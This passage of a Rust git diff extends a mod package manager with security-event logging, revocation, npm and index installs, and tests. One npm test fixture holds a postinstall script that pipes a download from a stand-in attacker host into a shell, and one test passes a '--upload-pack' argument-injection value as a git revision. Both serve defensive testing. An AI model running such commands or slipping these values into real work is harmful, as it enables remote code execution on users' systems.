 +        bytes.extend_from_slice(asset.as_bytes());
 +        bytes.push(0);
@@ -71528,6 +72738,8 @@ index 000000000..4cf6e15c3
 +}
 +
 +pub(super) const SCOPED_STATE_LIMIT: usize = 196_608;
++const SECURITY_EVENTS: &str = "security-events.jsonl";
++const SECURITY_EVENT_LIMIT: usize = 65_536;
 +
 +#[derive(Clone, Debug)]
 +pub(super) enum StateLocation {
@@ -71631,9 +72843,10 @@ index 000000000..4cf6e15c3
 +        Ok(store)
 +    }
 +
-+    /// Moves a corrupt store file aside; a reset `mods.json` keeps no mods selected.
++    /// Moves a corrupt store file aside; a reset `mods.json` keeps no mods selected and a reset
++    /// `packages.lock.json` leaves its packages as plain trusted selections.
 +    pub fn reset(&self, name: &str) -> Result<PathBuf> {
-+        if !matches!(name, "mods.json" | "host.json") {
++        if !matches!(name, "mods.json" | "host.json" | "packages.lock.json") {
 +            return Err(failure("store_file_not_resettable"));
 +        }
 +        let path = self.root.join(name);
@@ -71761,6 +72974,46 @@ index 000000000..4cf6e15c3
 +    pub fn configuration(&self) -> Result<ModConfiguration> {
 +        let path = self.root.join("mods.json");
 +        ModConfiguration::parse(&read(&path, 65_536)?, &path)
++    }
++
++    pub(super) fn record_security_event(&self, event: &str, detail: Value) -> Result<()> {
++        let at = std::time::SystemTime::now()
++            .duration_since(std::time::UNIX_EPOCH)
++            .map_err(failure)?
++            .as_secs();
++        let mut entry = json!({"at": at, "event": event});
++        if let (Some(entry), Value::Object(detail)) = (entry.as_object_mut(), detail) {
++            entry.extend(detail);
++        }
++        let mut line = serde_json::to_vec(&entry)?;
++        line.push(b'\n');
++        let mut bytes = self.security_event_bytes()?;
++        if bytes.len() + line.len() > SECURITY_EVENT_LIMIT {
++            let start = bytes.len() / 2;
++            let keep = bytes[start..]
++                .iter()
++                .position(|byte| *byte == b'\n')
++                .map_or(bytes.len(), |offset| start + offset + 1);
++            bytes.drain(..keep);
++        }
++        bytes.extend_from_slice(&line);
++        self.write_staged(SECURITY_EVENTS, &bytes, || Ok(()))
++    }
++
++    pub fn security_events(&self) -> Result<Vec<Value>> {
++        self.security_event_bytes()?
++            .split(|byte| *byte == b'\n')
++            .filter(|line| !line.is_empty())
++            .map(|line| serde_json::from_slice(line).map_err(Into::into))
++            .collect()
++    }
++
++    fn security_event_bytes(&self) -> Result<Vec<u8>> {
++        match read(&self.root.join(SECURITY_EVENTS), SECURITY_EVENT_LIMIT as u64) {
++            Ok(bytes) => Ok(bytes),
++            Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(Vec::new()),
++            Err(error) => Err(error),
++        }
 +    }
 +
 +    pub fn selection_status(&self) -> Result<Value> {
@@ -71956,32 +73209,63 @@ index 000000000..4cf6e15c3
 +            .filter(|selection| trusted.contains(&selection.path))
 +            .map(|selection| grant(&json!(selection)))
 +            .collect();
-+        self.write_granting("mods.json", &serde_json::to_value(config)?, &approved)
++        let event = json!({"selections": config.mods.iter()
++            .filter(|selection| trusted.contains(&selection.path))
++            .map(|selection| json!({"path": selection.path, "sha256": selection.sha256,
++                "capabilities": selection.capabilities, "scope": selection.scope,
++                "expires_at": selection.expires_at}))
++            .collect::<Vec<_>>()});
++        self.write_granting("mods.json", &serde_json::to_value(config)?, &approved)?;
++        let _ = self.record_security_event("trust", event);
++        Ok(())
 +    }
 +
-+    pub fn revoke_authority(&self, path: &Path) -> Result<()> {
++    /// Disables every selection of the mod `target` (an id or package path) and drops its grant.
++    pub fn revoke(&self, target: &str) -> Result<()> {
 +        let _lock = self.lock()?;
 +        self.recover_package_transaction()?;
++        let mut lock = self.read_package_lock().unwrap_or_default();
++        let managed = lock.packages.get_mut(target).map(|package| {
++            package.enabled = false;
++            package.trust = Default::default();
++            (package.path.clone(), package.scope.clone())
++        });
 +        let mut config = self.configuration()?;
-+        let selection = config
-+            .mods
-+            .iter_mut()
-+            .find(|m| m.path == path)
-+            .ok_or_else(|| failure("package_not_trusted"))?;
-+        selection.expires_at = Some(
-+            std::time::SystemTime::now()
-+                .duration_since(std::time::UNIX_EPOCH)
-+                .map_err(failure)?
-+                .as_secs(),
-+        );
-+        let renewed = BTreeSet::from([grant(&json!(selection))]);
++        let mut revoked = Vec::new();
++        for selection in &mut config.mods {
++            if managed
++                .as_ref()
++                .is_some_and(|(path, scope)| &selection.path == path && &selection.scope == scope)
++                || selection.path == Path::new(target)
++                || package(&selection.path).is_ok_and(|(manifest, _, _)| manifest.id == target)
++            {
++                selection.enabled = false;
++                selection.capabilities.clear();
++                selection.secret_environment.clear();
++                selection.expires_at = None;
++                revoked.push(json!({"path": selection.path, "scope": selection.scope}));
++            }
++        }
++        if revoked.is_empty() {
++            return Err(failure("package_not_trusted"));
++        }
 +        config.revision = config
 +            .revision
 +            .checked_add(1)
 +            .ok_or_else(|| failure("revision_overflow"))?;
-+        let value = serde_json::to_value(config)?;
-+        self.write_granting("mods.json", &value, &renewed)
-+            .or_else(|_| self.write("mods.json", &value))
++        let event = json!({"mod": target, "selections": revoked});
++        if managed.is_some() {
++            lock.revision = lock
++                .revision
++                .checked_add(1)
++                .ok_or_else(|| failure("revision_overflow"))?;
++            self.commit_package_transaction(lock, config, &[], "revoke", event)?;
++            Ok(())
++        } else {
++            self.write("mods.json", &serde_json::to_value(config)?)?;
++            let _ = self.record_security_event("revoke", event);
++            Ok(())
++        }
 +    }
 +
 +    pub fn enable(&self, path: &Path, enabled: bool) -> Result<()> {
@@ -72009,6 +73293,13 @@ index 000000000..4cf6e15c3
 +            let (manifest, _, hash) = package(path)?;
 +            if hash != selection.sha256 {
 +                return Err(failure("source_changed: inspect and trust the new digest"));
++            }
++            if manifest
++                .capabilities
++                .iter()
++                .any(|capability| !selection.capabilities.contains(capability))
++            {
++                return Err(failure("capability_denied: trust the package again"));
 +            }
 +            self.check_service_providers(&manifest, path)?;
 +        }
@@ -74280,10 +75571,10 @@ index 000000000..257d49d33
 +}
 diff --git a/codex-rs/omd/src/package_controls.rs b/codex-rs/omd/src/package_controls.rs
 new file mode 100644
-index 000000000..27c097c67
+index 000000000..162db9599
 --- /dev/null
 +++ b/codex-rs/omd/src/package_controls.rs
-@@ -0,0 +1,490 @@
+@@ -0,0 +1,512 @@
 +use crate::{ModInstallRequest, ModPackageSource, ModPackageTrust, ModStore};
 +use serde::Deserialize;
 +use serde_json::{Value, json};
@@ -74326,11 +75617,34 @@ index 000000000..27c097c67
 +    #[serde(default)]
 +    source: Option<ModPackageSource>,
 +    #[serde(default)]
++    reference: Option<String>,
++    #[serde(default)]
++    version: Option<String>,
++    #[serde(default)]
 +    index: Option<PathBuf>,
 +    #[serde(default = "user")]
 +    scope: String,
 +    #[serde(default)]
 +    expected_generation: Option<u64>,
++}
++
++#[derive(Deserialize)]
++#[serde(deny_unknown_fields)]
++struct IndexArguments {
++    #[serde(default)]
++    index: Option<PathBuf>,
++    #[serde(default)]
++    query: String,
++}
++
++/// Searches the requested or the store's curated package index.
++pub fn index(store: &ModStore, arguments: Value) -> io::Result<Value> {
++    let arguments: IndexArguments = serde_json::from_value(arguments)
++        .map_err(|error| failure(format!("package_arguments_invalid: {error}")))?;
++    let path = arguments.index.or_else(|| store.package_index()).ok_or_else(|| {
++        failure("package_index_unavailable: install from npm:, git+ or a folder instead")
++    })?;
++    store.package_index_entries(&path, &arguments.query)
 +}
 +
 +fn user() -> String {
@@ -74350,6 +75664,7 @@ index 000000000..27c097c67
 +        ModPackageSource::Local { .. } => "local",
 +        ModPackageSource::Repository { .. } => "repository",
 +        ModPackageSource::Package { .. } => "package",
++        ModPackageSource::Npm { .. } => "npm",
 +    }
 +}
 +
@@ -74411,6 +75726,7 @@ index 000000000..27c097c67
 +                "scope": selection["scope"],
 +                "path": selection["path"],
 +                "source": locked.map_or("selection", |package| source_kind(&package.source)),
++                "blocked": locked.and_then(|package| lock.blocked_reason(&package.id, &package.version, &package.integrity)),
 +                "installed": true,
 +                "enabled": enabled,
 +                "effective": if runtime.is_some() { running.is_some_and(|item| item["error"].is_null()) } else { wanted },
@@ -74483,17 +75799,17 @@ index 000000000..27c097c67
 +    };
 +    let (id, request, plan, selection, added) = match arguments.action.as_str() {
 +        "install" => {
-+            let source = arguments
-+                .source
-+                .clone()
-+                .ok_or_else(|| failure("package_source_required"))?;
-+            let (request, plan) = requested(
-+                store,
-+                source,
-+                arguments.index.clone(),
-+                arguments.scope.clone(),
-+                false,
-+            )?;
++            let index = arguments.index.clone().or_else(|| store.package_index());
++            let source = match (&arguments.source, &arguments.reference) {
++                (Some(source), None) => source.clone(),
++                (None, Some(reference)) => ModPackageSource::parse(reference, index.clone())?,
++                _ => return Err(failure("package_source_required: give a source or a reference")),
++            };
++            let source = match arguments.version.as_deref() {
++                Some(version) if !version.is_empty() => source.with_version(version)?,
++                _ => source,
++            };
++            let (request, plan) = requested(store, source, index, arguments.scope.clone())?;
 +            (plan.root.clone(), Some(request), Some(plan), None, None)
 +        }
 +        "update" => {
@@ -74514,10 +75830,9 @@ index 000000000..27c097c67
 +            });
 +            let (request, plan) = requested(
 +                store,
-+                package.source.clone(),
++                package.source.updatable(),
 +                index,
 +                package.scope.clone(),
-+                package.enabled,
 +            )
 +            .map_err(|error| failure(format!("package_update_unavailable: {error}")))?;
 +            (package.id, Some(request), Some(plan), None, None)
@@ -74684,7 +75999,6 @@ index 000000000..27c097c67
 +    source: ModPackageSource,
 +    index: Option<PathBuf>,
 +    scope: String,
-+    activate: bool,
 +) -> io::Result<(ModInstallRequest, crate::ModPackagePlan)> {
 +    let mut request = ModInstallRequest {
 +        action: None,
@@ -74692,7 +76006,6 @@ index 000000000..27c097c67
 +        source,
 +        index,
 +        scope,
-+        activate,
 +        trust: ModPackageTrust::default(),
 +        settings: BTreeMap::new(),
 +    };
@@ -82467,10 +83780,10 @@ index 000000000..519c5c3d7
 +}
 diff --git a/codex-rs/omd/tests/mods.rs b/codex-rs/omd/tests/mods.rs
 new file mode 100644
-index 000000000..90ba76f52
+index 000000000..6fae71b21
 --- /dev/null
 +++ b/codex-rs/omd/tests/mods.rs
-@@ -0,0 +1,4363 @@
+@@ -0,0 +1,4358 @@
 +use codex_omd::MOD_API_VERSION;
 +const CURRENT_API: &str = MOD_API_VERSION;
 +use codex_omd::MOD_HOST_FEATURES;
@@ -86404,16 +87717,17 @@ index 000000000..90ba76f52
 +    assert!(rejected(&status, "blocked").starts_with("admission_policy_unavailable"));
 +    assert!(runtime.grants("guard").is_some());
 +    let guard = root.join("guard");
-+    contended(|| store.revoke_authority(&guard));
++    let guard = guard.display().to_string();
++    contended(|| store.revoke(&guard));
 +    runtime.reload().unwrap();
 +    assert!(
 +        runtime.grants("limited").is_some() && runtime.grants("blocked").is_some(),
-+        "an expired policy grant no longer judges packages"
++        "a revoked policy mod no longer judges packages"
 +    );
 +    write_guard(strict);
 +    runtime.reload().unwrap();
 +    assert!(invoke(&mut runtime, "run").is_err());
-+    contended(|| store.revoke_authority(&guard));
++    contended(|| store.revoke(&guard));
 +    runtime.reload().unwrap();
 +    assert_eq!(
 +        invoke(&mut runtime, "run").unwrap(),
@@ -86753,34 +88067,28 @@ index 000000000..90ba76f52
 +    let status = runtime.status()["mods"][0]["authority"].clone();
 +    assert_eq!(status["current"], true);
 +    assert_eq!(status["exposure"].as_array().unwrap().len(), 5);
-+    contended(|| store.revoke_authority(&path));
++    contended(|| store.revoke("delegate"));
 +    runtime.reload().unwrap();
-+    let revoked = runtime.grants("delegate").unwrap();
-+    assert!(revoked.os_access.is_none() && revoked.approves.is_none());
-+    assert!(revoked.http_access.is_none() && revoked.fs_access.is_none());
-+    assert!(revoked.mcp_servers.is_empty());
 +    assert!(
-+        !revoked
-+            .capabilities
-+            .iter()
-+            .any(|c| c == "os" || c == "approve")
-+    );
-+    assert!(
-+        runtime
-+            .invoke(
-+                "delegate",
-+                runtime.generation(),
-+                "command",
-+                "run",
-+                Value::Null
-+            )
-+            .unwrap_err()
-+            .to_string()
-+            .contains("grant_expired: os")
++        runtime.grants("delegate").is_none(),
++        "a revoked mod is disabled"
 +    );
 +    assert_eq!(
-+        store.selection_status().unwrap()["selections"][0]["authority_current"],
-+        false
++        store.selection_status().unwrap()["selections"][0]["capabilities"],
++        json!([])
++    );
++    assert!(
++        store
++            .enable(&path, true)
++            .unwrap_err()
++            .to_string()
++            .starts_with("capability_denied"),
++        "re-enabling needs a new grant"
++    );
++    let events = store.security_events().unwrap();
++    assert_eq!(
++        events.iter().map(|event| event["event"].clone()).collect::<Vec<_>>(),
++        [json!("trust"), json!("revoke")]
 +    );
 +}
 +
@@ -86836,10 +88144,10 @@ index 000000000..90ba76f52
 +}
 diff --git a/codex-rs/omd/tests/packages.rs b/codex-rs/omd/tests/packages.rs
 new file mode 100644
-index 000000000..2f893bd28
+index 000000000..a0fd73d32
 --- /dev/null
 +++ b/codex-rs/omd/tests/packages.rs
-@@ -0,0 +1,764 @@
+@@ -0,0 +1,1381 @@
 +const CURRENT_API: &str = codex_omd::MOD_API_VERSION;
 +use codex_omd::ModInstallRequest;
 +use codex_omd::ModPackageGrant;
@@ -86904,7 +88212,6 @@ index 000000000..2f893bd28
 +        },
 +        index: None,
 +        scope: "user".into(),
-+        activate: true,
 +        offline: false,
 +        trust: ModPackageTrust {
 +            packages: BTreeMap::from([(
@@ -86964,8 +88271,7 @@ index 000000000..2f893bd28
 +    for number in 0..17 {
 +        let id = format!("catalog_{number:02}");
 +        let package = mod_package(&root, &id, "1.0.0", &["commands"], json!([]));
-+        let mut install = request(&package, &["commands"]);
-+        install.activate = false;
++        let install = request(&package, &["commands"]);
 +        let plan = store.package_plan(install.clone()).unwrap();
 +        store.package_apply(install, &plan.confirmation).unwrap();
 +    }
@@ -87105,10 +88411,15 @@ index 000000000..2f893bd28
 +    );
 +    let plan = store.package_plan(first.clone()).unwrap();
 +    assert_eq!(plan.action, "install");
-+    assert_eq!(plan.changes["packages"][0]["activation"]["to"], true);
++    assert_eq!(plan.changes["packages"][0]["activation"]["to"], false);
++    assert_eq!(plan.changes["packages"][0]["renewed_approval"], true);
 +    let lock = store.package_apply(first, &plan.confirmation).unwrap();
 +    assert_eq!(lock.packages["fixture"].version, "1.0.0");
-+    assert!(store.configuration().unwrap().mods[0].enabled);
++    assert!(
++        !store.configuration().unwrap().mods[0].enabled,
++        "installing never enables"
++    );
++    store.package_enable("fixture").unwrap();
 +    let status = store.selection_status().unwrap();
 +    assert_eq!(status["selections"][0]["effective"], true);
 +    assert_eq!(status["selections"][0]["managed"], true);
@@ -87408,7 +88719,6 @@ index 000000000..2f893bd28
 +        source: source.clone(),
 +        index: None,
 +        scope: "user".into(),
-+        activate: false,
 +        offline: false,
 +        trust: ModPackageTrust {
 +            packages: BTreeMap::from([(
@@ -87436,7 +88746,6 @@ index 000000000..2f893bd28
 +        },
 +        index: None,
 +        scope: "user".into(),
-+        activate: false,
 +        offline: true,
 +        trust: ModPackageTrust {
 +            packages: BTreeMap::from([(
@@ -87449,29 +88758,49 @@ index 000000000..2f893bd28
 +        },
 +        settings: BTreeMap::new(),
 +    };
-+    let plan = store.package_plan(offline).unwrap();
++    let plan = store.package_plan(offline.clone()).unwrap();
 +    assert_eq!(
 +        plan.packages[0].integrity,
 +        lock.packages["repo_mod"].integrity
 +    );
 +
-+    let invalid = ModInstallRequest {
-+        action: None,
-+        source: ModPackageSource::Repository {
-+            repository: unavailable.display().to_string(),
-+            revision: "main".into(),
++    std::fs::rename(&unavailable, &repository).unwrap();
++    let branch = git_output(&repository, &["rev-parse", "--abbrev-ref", "HEAD"]);
++    git(&repository, &["tag", "v2.0.0"]);
++    for reference in [branch.as_str(), "v2.0.0"] {
++        let mut by_reference = offline.clone();
++        by_reference.offline = false;
++        by_reference.source = ModPackageSource::Repository {
++            repository: repository.display().to_string(),
++            revision: reference.into(),
 +            subdirectory: "repo_mod".into(),
-+        },
-+        offline: false,
-+        ..request(&mod_package(&root, "unused", "1.0.0", &[], json!([])), &[])
-+    };
-+    assert!(
-+        store
-+            .package_plan(invalid)
-+            .unwrap_err()
-+            .to_string()
-+            .contains("immutable_repository_revision_required")
-+    );
++        };
++        let plan = store.package_plan(by_reference).unwrap();
++        assert!(
++            matches!(&plan.packages[0].source, ModPackageSource::Repository { revision: pinned, .. }
++                if pinned == &git_output(&repository, &["rev-parse", "HEAD"])),
++            "a branch or tag is pinned to its commit"
++        );
++    }
++    for reference in ["--upload-pack=touch", "../main", "main.lock"] {
++        let invalid = ModInstallRequest {
++            action: None,
++            source: ModPackageSource::Repository {
++                repository: repository.display().to_string(),
++                revision: reference.into(),
++                subdirectory: "repo_mod".into(),
++            },
++            offline: false,
++            ..request(&mod_package(&root, "unused", "1.0.0", &[], json!([])), &[])
++        };
++        assert!(
++            store
++                .package_plan(invalid)
++                .unwrap_err()
++                .to_string()
++                .contains("repository_reference_invalid")
++        );
++    }
 +}
 +
 +#[test]
@@ -87603,6 +88932,602 @@ index 000000000..2f893bd28
 +        .unwrap();
 +    assert!(output.status.success());
 +    String::from_utf8(output.stdout).unwrap().trim().to_owned()
++}
++
++#[test]
++fn command_line_and_directory_share_one_package_lifecycle() {
++    let temp = TempDir::new().unwrap();
++    let root = temp.path().canonicalize().unwrap();
++    let store = store(&temp);
++    let omd = |args: &[&str]| {
++        let output = Command::new(env!("CARGO_BIN_EXE_omd"))
++            .args(args)
++            .env(codex_omd::MOD_STORE_ENV, root.join("store"))
++            .current_dir(&root)
++            .stdin(std::process::Stdio::null())
++            .output()
++            .unwrap();
++        (
++            output.status.code().unwrap(),
++            String::from_utf8_lossy(&output.stdout).into_owned()
++                + &String::from_utf8_lossy(&output.stderr),
++        )
++    };
++    mod_package(&root, "cli_mod", "1.0.0", &["commands"], json!([]));
++    let (code, output) = omd(&["install", "./cli_mod"]);
++    assert_eq!(code, 2, "{output}");
++    assert!(output.contains("package_approval_required") && output.contains("capabilities: commands"));
++    assert!(store.package_lock().unwrap().packages.is_empty());
++    let (code, output) = omd(&["mods", "inspect", "./cli_mod"]);
++    assert!(code == 0 && output.contains("install cli_mod") && output.contains("needs your approval"), "{output}");
++    let (code, output) = omd(&["install", "./cli_mod", "--scope", "project", "--yes"]);
++    assert!(code == 0 && output.contains("It is off"), "{output}");
++
++    let listed = codex_omd::package_controls::list(&store, None).unwrap();
++    let cli = listed["packages"].as_array().unwrap().iter().find(|item| item["id"] == "cli_mod").unwrap();
++    assert_eq!((cli["scope"].as_str(), cli["enabled"].as_bool()), (Some("project"), Some(false)));
++    let directory = mod_package(&root, "directory_mod", "1.0.0", &["commands"], json!([]));
++    let preview = codex_omd::package_controls::preview(
++        &store,
++        json!({"action": "install", "reference": directory.display().to_string()}),
++    )
++    .unwrap();
++    codex_omd::package_controls::apply(&store, &preview.control).unwrap();
++    assert_eq!(omd(&["mods", "enable", "directory_mod", "--yes"]).0, 0);
++    let (_, output) = omd(&["mods", "list"]);
++    assert!(output.contains("cli_mod 1.0.0 project off (local)") && output.contains("directory_mod 1.0.0 user on (local)"), "{output}");
++
++    assert_eq!(omd(&["mods", "quarantine", "directory_mod", "known", "bad"]).0, 0);
++    let listed = codex_omd::package_controls::list(&store, None).unwrap();
++    assert!(listed["packages"].as_array().unwrap().iter().any(|item| item["id"] == "directory_mod" && item["blocked"] == "known bad" && item["enabled"] == false));
++    let (code, output) = omd(&["mods", "enable", "directory_mod", "--yes"]);
++    assert!(code == 1 && output.contains("package_blocked"), "{output}");
++    assert_eq!(omd(&["mods", "unblock", "directory_mod"]).0, 0);
++    assert_eq!(omd(&["mods", "remove", "cli_mod", "--yes"]).0, 0);
++    assert!(omd(&["mods", "catalog"]).1.contains("package_index_unavailable"));
++
++    let indexed = mod_package(&root, "indexed_mod", "2.0.0", &["commands"], json!([]));
++    let integrity = ModStore::inspect_package(&indexed).unwrap()["sha256"].clone();
++    let release = json!({"version": "2.0.0", "source": {"kind": "local", "path": indexed}, "integrity": integrity,
++        "description": "Indexed fixture", "support": "maintained"});
++    let mut recalled = release.clone();
++    recalled["version"] = json!("3.0.0");
++    recalled["blocked"] = json!("recalled");
++    let preview = mod_package(&root, "preview_mod", "0.3.0-preview.1", &["commands"], json!([]));
++    let preview_release = json!({"version": "0.3.0-preview.1", "source": {"kind": "local", "path": preview},
++        "integrity": ModStore::inspect_package(&preview).unwrap()["sha256"]});
++    std::fs::write(
++        root.join("store/package-index.json"),
++        serde_json::to_vec(&json!({"schema": 1, "packages": {"indexed_mod": [release, recalled],
++            "preview_mod": [preview_release]}}))
++        .unwrap(),
++    )
++    .unwrap();
++    let (code, output) = omd(&["install", "preview_mod@0.3.0-preview.1", "--yes"]);
++    assert_eq!(code, 0, "{output}");
++    let preview_update = codex_omd::package_controls::preview(&store, json!({"action": "update", "id": "preview_mod"}));
++    assert!(preview_update.is_ok(), "a prerelease updates to the newest index release");
++    let (_, output) = omd(&["mods", "catalog", "fixture"]);
++    assert!(output.contains("indexed_mod@2.0.0  Indexed fixture"), "{output}");
++    let (code, output) = omd(&["install", "indexed_mod@3.0.0", "--yes"]);
++    assert!(code == 1 && output.contains("package_version_blocked: recalled"), "{output}");
++    let (code, output) = omd(&["install", "indexed_mod", "--yes"]);
++    assert_eq!(code, 0, "{output}");
++    assert_eq!(store.package_lock().unwrap().packages["indexed_mod"].version, "2.0.0");
++    let events: serde_json::Value = serde_json::from_str(&omd(&["mods", "events"]).1).unwrap();
++    assert!(events.as_array().unwrap().iter().any(|event| event["event"] == "quarantine"));
++}
++
++type Routes = std::sync::Arc<std::sync::Mutex<BTreeMap<String, Vec<u8>>>>;
++
++fn registry() -> (String, Routes) {
++    use std::io::Read;
++    use std::io::Write;
++    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
++    let origin = format!("http://{}", listener.local_addr().unwrap());
++    let routes = Routes::default();
++    let served = routes.clone();
++    std::thread::spawn(move || {
++        for stream in listener.incoming() {
++            let Ok(mut stream) = stream else { continue };
++            let mut request = Vec::new();
++            let mut buffer = [0; 1024];
++            while !request.windows(4).any(|window| window == b"\r\n\r\n") {
++                match stream.read(&mut buffer) {
++                    Ok(0) | Err(_) => break,
++                    Ok(read) => request.extend_from_slice(&buffer[..read]),
++                }
++            }
++            let path = String::from_utf8_lossy(&request)
++                .split_whitespace()
++                .nth(1)
++                .unwrap_or_default()
++                .to_owned();
++            let routes = served.lock().unwrap();
++            let authorized = routes.get("!token").is_none_or(|token| {
++                String::from_utf8_lossy(&request)
++                    .lines()
++                    .any(|line| line == format!("Authorization: Bearer {}", String::from_utf8_lossy(token)))
++            });
++            let (status, body) = match routes.get(&path).cloned() {
++                Some(_) if !authorized => ("401 Unauthorized", Vec::new()),
++                Some(body) => ("200 OK", body),
++                None => ("404 Not Found", Vec::new()),
++            };
++            drop(routes);
++            let _ = stream.write_all(
++                format!(
++                    "HTTP/1.1 {status}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
++                    body.len()
++                )
++                .as_bytes(),
++            );
++            let _ = stream.write_all(&body);
++        }
++    });
++    (origin, routes)
++}
++
++fn tarball(entries: &[(&str, u8, &[u8])]) -> Vec<u8> {
++    use std::io::Write;
++    let mut tar = Vec::new();
++    for (name, kind, data) in entries {
++        let mut header = [0u8; 512];
++        header[..name.len()].copy_from_slice(name.as_bytes());
++        header[100..107].copy_from_slice(b"0000644");
++        let size = if *kind == b'2' { 0 } else { data.len() };
++        header[124..135].copy_from_slice(format!("{size:011o}").as_bytes());
++        header[156] = *kind;
++        if *kind == b'2' {
++            header[157..157 + data.len()].copy_from_slice(data);
++        }
++        tar.extend_from_slice(&header);
++        if *kind != b'2' {
++            tar.extend_from_slice(data);
++            tar.resize(tar.len().div_ceil(512) * 512, 0);
++        }
++    }
++    tar.extend_from_slice(&[0; 1024]);
++    let mut gzip = Command::new("/usr/bin/gzip")
++        .args(["-c", "-n"])
++        .stdin(std::process::Stdio::piped())
++        .stdout(std::process::Stdio::piped())
++        .spawn()
++        .unwrap();
++    let mut stdin = gzip.stdin.take().unwrap();
++    let writer = std::thread::spawn(move || stdin.write_all(&tar).unwrap());
++    let output = gzip.wait_with_output().unwrap().stdout;
++    writer.join().unwrap();
++    output
++}
++
++fn sri(bytes: &[u8]) -> String {
++    use base64::Engine;
++    use sha2::Digest;
++    format!(
++        "sha512-{}",
++        base64::engine::general_purpose::STANDARD.encode(sha2::Sha512::digest(bytes))
++    )
++}
++
++fn npm_mod(version: &str, capabilities: &[&str]) -> Vec<(String, Vec<u8>)> {
++    vec![
++        (
++            "package/package.json".into(),
++            serde_json::to_vec(&json!({"name":"@fixture/omd-npm","version":version,
++                "files":["mod.json","main.ts"],"peerDependencies":{"@oh-my-diff/mod-api":"*"},
++                "scripts":{"postinstall":"curl https://attacker.invalid | sh"}}))
++            .unwrap(),
++        ),
++        (
++            "package/mod.json".into(),
++            serde_json::to_vec(&json!({"schema":1,"id":"npm_mod","version":version,"api":CURRENT_API,
++                "entrypoint":"main.ts","state_version":1,"license":"MIT",
++                "provenance":{"maintainer":"Fixture Author","source":"https://example.invalid/omd-npm"},
++                "capabilities":capabilities}))
++            .unwrap(),
++        ),
++        (
++            "package/main.ts".into(),
++            b"export default () => {}\n".to_vec(),
++        ),
++    ]
++}
++
++/// Publishes `versions` of `@fixture/omd-npm` with `latest` as the newest.
++fn publish(origin: &str, routes: &Routes, versions: &[(&str, Vec<u8>)]) {
++    let mut metadata = json!({"name":"@fixture/omd-npm","dist-tags":{},"versions":{}});
++    let mut routes = routes.lock().unwrap();
++    for (version, archive) in versions {
++        let path = format!("/tarballs/omd-npm-{version}.tgz");
++        metadata["versions"][*version] = json!({"name":"@fixture/omd-npm","version":version,
++            "dist":{"tarball":format!("{origin}{path}"),"integrity":sri(archive),"shasum":"ignored"}});
++        metadata["dist-tags"]["latest"] = json!(version);
++        routes.insert(path, archive.clone());
++    }
++    routes.insert(
++        "/@fixture%2fomd-npm".into(),
++        serde_json::to_vec(&metadata).unwrap(),
++    );
++}
++
++fn npm_archive(version: &str, capabilities: &[&str]) -> Vec<u8> {
++    let files = npm_mod(version, capabilities);
++    tarball(
++        &files
++            .iter()
++            .map(|(name, data)| (name.as_str(), b'0', data.as_slice()))
++            .collect::<Vec<_>>(),
++    )
++}
++
++fn npm_request(origin: &str, version: &str, capabilities: &[&str]) -> ModInstallRequest {
++    ModInstallRequest {
++        source: ModPackageSource::Npm {
++            package: "@fixture/omd-npm".into(),
++            version: version.into(),
++            registry: origin.into(),
++            integrity: String::new(),
++        },
++        trust: ModPackageTrust {
++            packages: BTreeMap::from([(
++                "npm_mod".into(),
++                ModPackageGrant {
++                    capabilities: capabilities.iter().map(|value| value.to_string()).collect(),
++                    ..ModPackageGrant::default()
++                },
++            )]),
++        },
++        settings: BTreeMap::new(),
++        ..request(Path::new("/npm_mod"), &[])
++    }
++}
++
++fn refusal(store: &ModStore, request: ModInstallRequest) -> String {
++    store.package_plan(request).unwrap_err().to_string()
++}
++
++#[test]
++fn npm_packages_resolve_exact_verified_versions_and_reinstall_offline() {
++    let temp = TempDir::new().unwrap();
++    let store = store(&temp);
++    let (origin, routes) = registry();
++    publish(
++        &origin,
++        &routes,
++        &[
++            ("1.0.0", npm_archive("1.0.0", &["commands"])),
++            ("1.1.0", npm_archive("1.1.0", &["commands"])),
++            ("2.0.0", npm_archive("2.0.0", &["commands"])),
++        ],
++    );
++    let install = npm_request(&origin, "^1.0.0", &["commands"]);
++    let plan = store.package_plan(install.clone()).unwrap();
++    let pinned = ModPackageSource::Npm {
++        package: "@fixture/omd-npm".into(),
++        version: "1.1.0".into(),
++        registry: origin.clone(),
++        integrity: sri(&npm_archive("1.1.0", &["commands"])),
++    };
++    assert_eq!(plan.packages[0].source, pinned);
++    assert_eq!(plan.packages[0].version, "1.1.0");
++    let lock = store.package_apply(install, &plan.confirmation).unwrap();
++    assert!(!lock.packages["npm_mod"].enabled);
++    assert!(lock.packages["npm_mod"].path.starts_with(temp.path().canonicalize().unwrap().join("store/package-cache")));
++    assert_eq!(
++        store.package_plan(npm_request(&origin, "", &["commands"])).unwrap().packages[0].version,
++        "2.0.0",
++        "no selector follows the latest tag"
++    );
++
++    routes.lock().unwrap().clear();
++    let mut offline = npm_request(&origin, "1.1.0", &["commands"]);
++    offline.offline = true;
++    assert_eq!(
++        store.package_plan(offline).unwrap().packages[0].integrity,
++        lock.packages["npm_mod"].integrity
++    );
++    let mut missing = npm_request(&origin, "2.0.0", &["commands"]);
++    missing.offline = true;
++    assert!(refusal(&store, missing).contains("npm_package_unavailable_offline_and_not_cached"));
++    assert!(refusal(&store, npm_request(&origin, "^1.0.0", &["commands"])).contains("npm_fetch_failed"));
++
++    store.package_enable("npm_mod").unwrap();
++    publish(
++        &origin,
++        &routes,
++        &[
++            ("1.1.0", npm_archive("1.1.0", &["commands"])),
++            ("1.2.0", npm_archive("1.2.0", &["commands"])),
++        ],
++    );
++    let update = ModInstallRequest {
++        source: lock.packages["npm_mod"].source.updatable(),
++        ..npm_request(&origin, "", &["commands"])
++    };
++    let plan = store.package_plan(update.clone()).unwrap();
++    assert_eq!(plan.action, "update");
++    assert_eq!(plan.packages[0].version, "1.2.0");
++    assert_eq!(plan.changes["packages"][0]["renewed_approval"], false);
++    let lock = store.package_apply(update, &plan.confirmation).unwrap();
++    assert!(lock.packages["npm_mod"].enabled, "an unchanged grant stays on");
++    let rollback = store.package_rollback_plan("npm_mod").unwrap();
++    let lock = store.package_rollback("npm_mod", &rollback.confirmation).unwrap();
++    assert_eq!(lock.packages["npm_mod"].version, "1.1.0");
++}
++
++#[test]
++fn hostile_npm_archives_and_registry_substitution_are_refused() {
++    let temp = TempDir::new().unwrap();
++    let store = store(&temp);
++    let (origin, routes) = registry();
++    let honest = npm_archive("1.0.0", &["commands"]);
